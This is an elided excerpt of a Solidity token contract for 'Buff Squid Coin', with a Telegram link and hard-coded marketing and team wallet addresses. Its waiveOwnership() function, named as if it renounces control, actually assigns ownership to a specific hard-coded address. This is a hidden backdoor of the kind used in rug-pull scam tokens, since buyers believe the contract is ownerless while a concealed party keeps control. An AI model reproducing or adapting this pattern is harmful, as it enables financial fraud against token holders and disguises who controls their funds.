...
/**
Telegram : https://t.me/BuffSquidCoinPortal
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7B228194608803b1246eBC9289f049873a64bC2E);
    }
...
contract BuffSquidCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Buff Squid Coin";
    string private _symbol = "Squid Coin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9262d7F7D1229Efd927CeBbAE962b56339298Ff8);
    address payable public teamWalletAddress = payable(0xba47B298Df3f33Fd8B1a597eF8c64258412faB62);
